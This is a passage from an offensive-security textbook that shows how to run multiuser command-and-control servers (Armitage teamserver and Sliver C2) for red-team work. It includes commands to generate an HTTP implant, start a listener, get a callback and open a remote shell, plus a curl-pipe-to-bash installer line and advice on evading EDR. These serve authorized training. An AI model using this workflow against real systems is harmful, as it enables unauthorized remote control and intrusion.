While Gophish isn’t the only tool kit to use for phishing engagements, it’s hard to beat for professional applications. It has built-in reporting to generate metrics for your clients based on the results, and you can even extend these metrics to measure code-execution success. For more targeted spear phishing, the metrics don’t matter nearly as much as the results, so you could use any technologies you wanted to send the phishing email and deploy the site yourself. The skills you’d need to do so are no different from those for setting up a web server, as you did in Chapter 3, and a manual approach offers you the benefit of flexibility. As with other tools you’ve seen, while Gophish is a solid choice for professional contexts, it isn’t always the best tool for the job.

Good work! You now know how to configure a wide range of infrastructure for red team operations—from simple C2 servers to C2 redirectors with custom C2 software tool kits and phishing campaigns. With these skills, you can build and deploy infrastructure for an end-to-end red team operation. You’ll be able to catch shells for your team and even assist with initial access via social engineering attacks. You can carry out a lot of TTPs with a full suite of infrastructure like this and, thanks to automation, you can do so with the scale to support a full team of operators. It’s called red team for a reason, though: Depending on the scale of your engagement, sometimes you need multiple operators working across target systems. Fortunately, collaboration tools are available, and once you determine what you need, they should be easy for you to configure for your team with the knowledge you’ve gained throughout this book.

11 MULTIPLAYER C2 CONFIGURATION

11
MULTIPLAYER C2 CONFIGURATION
The No Starch Press iron logo
Multiuser C2 configurations like team servers provide a shared interface where team members can connect remotely, coordinate their actions, manage compromised systems, and exchange information in real time. These configurations are often described with gaming terms like multiplayer mode, and it’s true that they can be fun in the context of Capture the Flag (CTF) games. But make no mistake: When used correctly, these are powerful configurations for team collaborations. Many are also field tested and ready for real-world offensive security operations. In this final chapter, you’ll work with two C2 tools that implement multiuser options: teamserver (used by Cobalt Strike and Armitage) and Sliver C2.

For these setups, you’ll be using the base-c2 Terraform configurations again (https://github.com/3ndG4me/Offensive-Security-Engineering/tree/master/base-c2). These configurations should have already opened the necessary ports on your C2 server to expose your services for the multiuser setup.

teamserver for Cobalt Strike and Armitage
You’ll start with teamserver, a simple command line tool that basically takes care of all the complexities for you. If you’re familiar with Cobalt Strike, you might recognize the teamserver tool already. Cobalt Strike (https://www.cobaltstrike.com), a paid adversarial emulation tool kit that is compatible with the Metasploit framework, provides custom implants, evasion techniques, macro document generation, and more. Although powerful, it’s not the easiest tool to use, and it’s expensive, targeting corporate budgets and security consultancies.

Cobalt Strike offers trials and licenses for educational events and CTF competitions, as well as an open source alternative known as Armitage (https://github.com/rsmudge/armitage). However, Armitage hasn’t been updated since 2015 and lacks most of Cobalt Strike’s premium (closed source) features. Its main advantage—providing a GUI on top of the Metasploit Framework with additional automation and features—is largely obsolete unless you’re using a pre-MSF4 version of Metasploit. Despite those limitations, Armitage retains the teamserver functionality of Cobalt Strike, and thus it gives you the opportunity to practice configuring a multiuser infrastructure that is compatible with Cobalt Strike without having to get a trial license.

The teamserver tool is installed by default on Kali Linux and should be available on your C2 server if you’re using the resources provided in the book’s repository. If not, you can use any standard Kali Linux installation or simply install Armitage from the default Kali Linux apt repositories.

Starting the Metasploit Database and teamserver
To spin up a team server, first make sure your Metasploit database is initialized by running msfdb init. From there, all you have to do is make sure the port you want to run on is exposed (port 55553, in this case) and provide both the listening public IP address and the shared authentication key that your team will use to access the server:

ec2-user@kali:~$ msfdb init
ec2-user@kali:~$ sudo teamserver 172.31.38.235 lolhax
[*] Generating X509 certificate and keystore (for SSL)
[*] Starting RPC daemon
[*] MSGRPC starting on 127.0.0.1:55554 (NO SSL):Msg . . .
[*] MSGRPC background at 2020-04-19 08:51:52 +0000 . . .
[*] sleeping for 20s (to let msfrpcd initialize)
[*] Starting Armitage team server
[*] Use the following connection details to connect your clients:
    Host: 172.31.38.235
    Port: 55553
    User: msf
    Pass: lolhax

[*] Fingerprint (check for this string when you connect):
    a14a06cf635b56e0e037bbadacb78ad196e513a75
[+] feel free to connect now, Armitage is ready for collaboration
In an actual engagement, be sure to replace 172.31.38.235 with your server’s external IP address, and lolhax with a much more secure password.

Running teamserver will start the Metasploit framework, configure the RPC daemon so that multiple users can access it via the Armitage interface, and then start the team server to provide you with a fingerprint hash. You can share this hash value with your teammates along with the password; the hash acts as a secondary validator that lets users know that they’re connecting to the correct server. This best practice helps protect against man-in-the-middle attacks when a service may lack more automated restrictions. This is similar to the way Salt Project works; you’re just implementing it manually here.

Connecting to teamserver with Armitage
With your team server running, you can connect with an Armitage client. Because your server is running on a C2 server exposed to the public internet, you can connect to it from any internet-connected system. As long as you have a local Kali Linux system set up, you can run the armitage command like so:

root@kali:~# armitage
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
When Armitage starts, you’ll see a login prompt. This prompt is usually prefilled with the parameters you need to connect to a locally running Armitage instance, so you’ll need to replace those values with the remote instance of your team server. Enter your domain name (or the remote host IP address if you have no domain); port 55553; the default username, msf; and finally, the password you set for the team server (see Figure 11-1). Click Connect to continue.

Armitage client connection form showing host udemy-c2.injection.sh, port 55553, username msf, masked password, and Connect and Help buttons at bottom.
Figure 11-1: Connecting to the Armitage client

If authentication is successful, the server will prompt you to verify the authenticity of the fingerprint hash before proceeding (see Figure 11-2). Click Yes.

Armitage client’s fingerprint verification alert box showing server checksum value with No and Yes buttons to decline or confirm the connection.
Figure 11-2: Verifying the team server’s fingerprint

Next, you’ll be prompted to provide a nickname, as shown in Figure 11-3. This is how your teammates will identify you. It can be your real name, hacker handle, or any other string of characters you wish. Click OK.

Armitage client’s nickname form showing a textbox with value “3ndG4me” entered and Cancel and OK buttons below.
Figure 11-3: Adding your team server nickname

You are now logged in to the Armitage team server and should see confirmation in the console:

01/19 09:57:11 *** 3ndG4me joined
Interacting with teamserver
Over on your C2 server, you can see that 3ndG4me has connected to your team server:

ec2-user@kali:~$ sudo teamserver 172.31.38.235 lolhax
[*] Generating X509 certificate and keystore (for SSL)
[*] Starting RPC daemon
[*] MSGRPC starting on 127.0.0.1:55554 (NO SSL):Msg . . .
[*] MSGRPC background at 2020-04-19 08:51:52 +0000 . . .
[*] sleeping for 20s (to let msfrpcd initialize)
[*] Starting Armitage team server
[*] Use the following connection details to connect your clients:
    Host: 172.31.38.235
    Port: 55553
    User: msf
    Pass: lolhax

[*] Fingerprint (check for this string when you connect):
    a14a06cf635b56e0e037bbadacb78ad196e513a75
[+] feel free to connect now, Armitage is ready for collaboration
[+] 3ndG4me joined
At this point, you can use the Event Log feature to chat with team members (see Figure 11-4).

Armitage client showing a black screen (right), module folders (left), and Event Log area (bottom) displaying “3ndG4me joined” followed by a chat message “hey”.
Figure 11-4: The Armitage Event Log and team server chat

You can also use Metasploit to exploit a system. If you’re successful, that compromised system will show up in the interface for any connected team member to interact with. This is great for a red team: An engineer could configure the server while one operator conducts the exploitation, and then another operator can take over the exploited system to focus on post-exploitation while the first operator turns to exploiting the next system. This arrangement can allow for some fairly creative and efficient workflows, with different team members focusing on different operational roles throughout the kill chain of a threat model.

Now you’ve seen how using Armitage with teamserver works, but what if you want a more modern, open source alternative? Enter the Sliver C2 framework.

Multiplayer Mode for Sliver C2
While Armitage and Cobalt Strike integrate directly with the Metasploit framework for initial exploitation (with Armitage being a literal GUI on top of Metasploit), Sliver C2 (https://github.com/BishopFox/sliver) focuses entirely on post-exploitation. That said, Sliver C2 is compatible with Metasploit in that it can use Metasploit-generated payloads and inject Meterpreter payloads into memory.

Sliver C2, built on Go, provides some pretty powerful cross-platform capabilities for both the implant and server. Sliver implants feature strong obfuscation techniques and dynamic compilation within the C2, but of course they’re still fully open source. This means a new version of Sliver C2 might get around EDR for a brief period of time, but this window will close almost as quickly as it opens. However, like Meterpreter payloads, Sliver implants can still bypass EDR with the right techniques (at least as of this writing, but remember that C2 tooling is an ever-evolving landscape, which is why you need to be able to write your own!).

Though not an exploitation framework itself, Sliver is an effective post-exploitation tool kit. While its built-in tools for post-exploitation aren’t quite as robust as those from frameworks like Metasploit and Empire, it makes up for that in targeted efficiency. Sliver is a fantastic choice for meticulously planned and carefully executed red team operations.

Installing Sliver C2
To configure a multiplayer instance, first you need to download the latest precompile server and client binaries from https://github.com/BishopFox/sliver, unzip them, and run them:

ec2-user@kali:~$ unzip sliver-server_linux.zip
Archive:    sliver-server_linux.zip
    Inflating: sliver-server
ec2-user@kali:~$ ls
sliver-server sliver-server_linux.zip
ec2-user@kali:~$ sudo /root/sliver-server
Alternatively, you can use Sliver’s suggested installation method of running the command curl https://sliver.sh/install | sudo bash. Just remember, you’re trusting the source at https://sliver.sh/install to be correct, but you should always read a script before using curl to pipe it into bash. In either case, as long as your installation is successful, you’ll be presented with the Sliver CLI:

┌──(root㉿kali)-[~]
└─# ./sliver-server

.------..------..------..------..------..------.
|S.--. ||L.--. ||I.--. ||V.--. ||E.--. ||R.--. |
| :/\: || :/\: || (\/) || :(): || (\/) || :(): |
| :\/: || (__) || :\/: || ()() || :\/: || ()() |
| '--'S|| '--'L|| '--'I|| '--'V|| '--'E|| '--'R|
'------'`------'`------'`------'`------'`------'

All hackers gain hidden agenda
[*] Server v1.5.43 - e116a5ec3d26e8582348a29cfd251f915ce4a405
[*] Welcome to the sliver shell, please type 'help' for options
From here, you can run help to review all the options:

[server] sliver > help

Commands:
=========
  clear       clear the screen
  exit        exit the shell
  help        use 'help [command]' for command help
  monitor     Monitor threat intel platforms for Sliver implants
  wg-config   Generate a new WireGuard client config
  wg-portfwd  List ports forwarded by the WireGuard tun interface
  wg-socks    List socks servers listening on the WireGuard tun interface


Generic:
========
  aliases           List current aliases
  armory            Automatically download and install extensions/aliases
  background        Background an active session
  beacons           Manage beacons
  builders          List external builders
  canaries          List previously generated canaries
  ...
  sessions          Session management
  settings          Manage client settings
  stage-listener    Start a stager listener
  tasks             Beacon task management
  update            Check for updates
  use               Switch the active session or beacon
  version           Display version information
  websites          Host static content (used with HTTP C2)
  wg                Start a WireGuard listener


Multiplayer:
============
  kick-operator  Kick an operator from the server
  multiplayer    Enable multiplayer mode
  new-operator   Create a new operator config file
  operators      Manage operators


For even more information, please see our wiki: https://github.com/BishopFox/sliver/wiki
Configuring Multiplayer Mode
Your primary concern is the Multiplayer section. Multiplayer mode is useful when you want to operate with multiple teammates or simply work from your local system without requiring an SSH connection to the server. To start a multiplayer instance, run the following command:

sliver > multiplayer
[*] Multiplayer mode enabled!
This command starts a server on port 31337 by default. Before you can join the multiplayer server, you also need to define a new “player” by passing in an operator name followed by the hostname or public IP address of your C2 server:

sliver > new-operator --name 3ndG4me --lhost test-c2.injection.sh

[*] Generating new client certificate, please wait ...
[*] Saved new client config to: /home/ec2-user/3ndG4me_test-c2.injection.sh.cfg
This command generates a new configuration file that you can share with your teammates. This is basically an authentication certificate, authorizing someone to join as a user that is configured and recognized by the server. Before you configure the Sliver client, copy the configuration file:

user@kali:~$ sudo cat 3ndG4me_test-c2.injection.sh.cfg

{"operator":"3ndG4me","host":"test-c2.injection.sh","lport":31337,"ca_certificate":"
-----BEGIN CERTIFICATE-----
...
Save this certificate to your local system. Then download the client binary the same way you just downloaded the server binary. This time, however, you’re installing it to your local system, so be sure to download it for the correct operating system. If you’re using Linux, download the sliver-client_linux.zip package from the releases section on the Sliver GitHub.

Next, import the client config and run the Sliver client:

$ ./sliver-client import YOUR_CONFIG.cfg
$ ./sliver-client
That’s it for the setup! You’re now established as a user in Multiplayer mode for Sliver C2. Check the server-side connections, and you should see that your player has connected and is online, similar to teamserver earlier:

sliver > multiplayer

[*] Multiplayer mode enabled!

sliver > new-player —operator 3ndG4me —lhost test-c2.injection.sh

[*] Generating new client certificate, please wait ...
[*] Saved new client config to: /home/ec2-user/3ndG4me_test-c2.injection.sh.cfg

[*] 3ndG4me has joined the game

sliver > operators

Operator       Status
========       ======
3ndG4me        Online
Getting a Callback with Sliver C2
As a multiplayer user, you can execute the same commands you did as a direct user of the server. Let’s quickly generate a binary and then execute it on one of your Linux VMs or one of the extra Linux servers in your AWS environment:

sliver > generate —-http test-c2.injection.sh —-skip-symbols —-os linux

[*] Generating new linux/amd64 Sliver binary
[!] Symbol obfuscation is disabled
[*] Build completed in 00:00:16
[*] Sliver binary saved to: /Users/caseyerdmann/Desktop/TIGHT_RASPBERRY
This command generates a payload that will connect over HTTP. Sliver C2 supports other protocols, including Mutual-TLS and DNS, each of which has its own benefits. HTTP and HTTPS payloads in Sliver work similarly to HTTP and HTTPS payloads in other C2 frameworks. This payload will be saved to your local system because you generated it from your client as a multiplayer user.

NOTE
In this example, you’ve generated the binary without obfuscation, which you should do only if you’re running on a system with low resources. Otherwise, you’ll always want a fresh obfuscated payload to decrease your chances of getting caught while writing to disk or executing the payload.

Now you can start the listener that the implant will call back to as follows:

sliver > http
[*] Starting HTTP :80 listener ...
[*] Successfully started job #2
Transfer the implant binary to your target system and execute it:

ubuntu@ip-172-31-16-147:~$ ls
TIGHT_RASPBERRY

ubuntu@ip-172-31-16-147:~$ ./TIGHT_RASPBERRY
Swap back over to your C2 server to view the response in Sliver:

[*] Session #1 TIGHT_RASPBERRY - 3.23.94.74:48226 (ip-172-31-16-147) - linux/amd64

sliver > use 1

[*] Active sliver TIGHT_RASPBERRY (1)
sliver (TIGHT_RASPBERRY) >
You should get a successful callback and can now use your command session. Any other user you’re working with can also connect to the C2 server and interact with this session, allowing your team to conduct more-complex attack scenarios. During an active session, running help displays the full range of capabilities your team could take advantage of:

sliver (TIGHT_RASPBERRY) > help
Sliver:
=======
  cat                Dump file to stdout
  cd                 Change directory
  chmod              Change permissions on a file or directory
  chown              Change owner on a file or directory
  chtimes            Change access and modification times on a file (timestomp)
  close              Close an interactive session without killing the remote process
  download           Download a file
  execute            Execute a program on the remote system
  execute-shellcode  Executes the given shellcode in the sliver process
  extensions         Manage extensions
  getgid             Get session process GID
  getpid             Get session pid
  getuid             Get session process UID
  ifconfig           View network interface configurations
  info               Get info about session
  interactive        Task a beacon to open an interactive session (Beacon only)
  kill               Kill a session
  ls                 List current directory
  ...
  screenshot         Take a screenshot
  shell              Start an interactive shell
  shikata-ga-nai     Polymorphic binary shellcode encoder (ノ ゜Д゜)ノ ︵ 仕方がない
  sideload           Load and execute a shared object (shared library/DLL) in a remote process
  socks5             In-band SOCKS5 Proxy
  ssh                Run a SSH command on a remote host
  terminate          Terminate a process on the remote system
  upload             Upload a file
  whoami             Get session user execution context

sliver (TIGHT_RASPBERRY) > shell

? This action is bad OPSEC, are you an adult? Yes
[*] Opening shell tunnel (EOF to exit) ...
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

ubuntu@ip-172-31-16-147:~$ id

uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),
27(sudo)
You could also drop into a regular command shell and execute commands from there. Doing so may generate artifacts that compromise operational security, so proceed with caution; you’re on your own in terms of detection.

Other Multiuser C2 Tool Kits
If you need tooling for multiuser team operations in offensive security, both teamserver and Sliver C2 are fantastic options, but they’re not the only ones. Empire’s Starkiller project (https://github.com/BC-SECURITY/Starkiller) provides a Cobalt Strike–like web frontend for the Empire API that also allows for multiuser interaction. Covenant (https://github.com/cobbr/Covenant), a C2 framework with capabilities similar to Empire, includes multiuser functionality by design. And if you’re looking for a tool kit that allows you to implement your newfound OST development skills and supports multiuser functionality, look no further than Lupo C2 (https://github.com/InjectionSoftwareandSecurityLLC/lupo), which combines the best features of Starkiller and Sliver in its multiuser WolfPack server. Lupo’s API-driven approach allows you to integrate custom implants while collaborating with your team through chat and operational logging.

Any of these tools would be a great choice for conducting full-scale offensive security operations. As always, your pick should be based primarily on your specific engagement’s TTPs.

Conclusion
With the experience and skills you’ve gained throughout this book, you should be well prepared to dive into any tool kit you prefer. If you feel stuck, consult the documentation, but remember that despite their individual nuances, the fundamentals are the same across every scenario you’ve practiced.

Now go forth and get shells!
